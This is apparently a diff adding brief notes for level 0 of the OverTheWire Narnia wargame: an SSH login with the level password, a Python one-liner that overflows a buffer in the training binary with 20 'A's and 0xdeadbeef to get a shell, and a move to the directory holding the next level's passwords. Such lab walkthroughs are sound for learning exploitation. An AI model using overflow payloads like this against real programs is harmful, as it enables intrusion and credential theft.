@@ -1,0 +1,9 @@
+ssh narnia0@narnia.labs.overthewire.org -p 2226
+
+narnia0
+
+cd /narnia
+
+(python -c 'import struct; print("A"*20 + struct.pack("<I",0xdeadbeef))' ; cat) | ./narnia0
+
+cd /etc/narnia_pass/
